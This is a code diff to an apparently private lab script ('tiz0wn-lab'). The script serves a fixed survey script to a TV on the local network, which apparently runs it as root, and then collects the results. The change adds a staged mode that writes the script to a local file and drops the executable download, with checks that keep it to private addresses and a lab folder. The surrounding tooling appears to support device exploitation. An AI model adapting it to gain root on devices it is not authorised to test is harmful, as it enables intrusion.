@@ -50,6 +50,11 @@ rm -f "$OUT"
 '''.encode('utf-8')
 
 
+def staged_command_text(host: str, token: str) -> bytes:
+    """Same fixed read-only survey; staged beforehand instead of downloaded as root."""
+    return command_text('Snapshot', host, token)
+
+
 def valid_report(body: bytes) -> bool:
     lines = body.splitlines()
     return (len(lines) >= 4
@@ -60,10 +65,12 @@ def valid_report(body: bytes) -> bool:
 
 class SnapshotServer(HTTPServer):
     """Single-threaded bounded receiver; one script fetch and one result."""
-    def __init__(self, address, tv: str, token: str, output: Path):
+    def __init__(self, address, tv: str, token: str, output: Path, staged: bool = False):
         self.tv, self.token, self.output = tv, token, output
         self.payload = command_text('Snapshot', address[0], token)
-        self.served = False
+        # Staged mode is only accepted with a separately verified SDB transfer.
+        # It receives a one-time result without serving an executable GET body.
+        self.served = staged
         self.received = False
         super().__init__(address, Receiver)
         self.timeout = 0.5
@@ -144,6 +151,8 @@ def main() -> int:
     parser.add_argument('--output', required=True)
     parser.add_argument('--mode', choices=['Snapshot'], default='Snapshot')
     parser.add_argument('--timeout', type=int, default=300)
+    parser.add_argument('--staged', action='store_true', help='Receive staged result, no executable GET')
+    parser.add_argument('--write-stage', type=Path, help='Only render fixed survey to a private local file')
     args = parser.parse_args()
     host, tv = str(ipaddress.IPv4Address(args.host)), str(ipaddress.IPv4Address(args.tv))
     if not all(ipaddress.IPv4Address(value).is_private and not ipaddress.IPv4Address(value).is_loopback
@@ -151,11 +160,19 @@ def main() -> int:
         parser.error('Only private LAN addresses allowed')
     if not re.fullmatch(r'[0-9a-f]{24,48}', args.token) or not 1 <= args.timeout <= 600:
         parser.error('Invalid session token or timeout')
+    if args.write_stage:
+        destination = args.write_stage.resolve()
+        private_lab = (ROOT / '.local/tiz0wn-lab').resolve()
+        if private_lab not in destination.parents or destination.exists():
+            parser.error('Staged script must be a new file inside the private lab')
+        destination.write_bytes(staged_command_text(host, args.token))
+        print('STAGE-RENDERED: fixed read-only survey prepared locally.', flush=True)
+        return 0
     output = Path(args.output).resolve()
     if (ROOT / '.local/tiz0wn-lab').resolve() not in output.parents or output.exists():
         parser.error('Output must be a new private lab file')
     output.parent.mkdir(parents=True, exist_ok=True)
-    with SnapshotServer((host, 8181), tv, args.token, output) as server:
+    with SnapshotServer((host, 8181), tv, args.token, output, staged=args.staged) as server:
         print('Snapshot receiver ready; reconnect Remote PC and open Shared Folder once.', flush=True)
         deadline = time.monotonic() + args.timeout
         try:
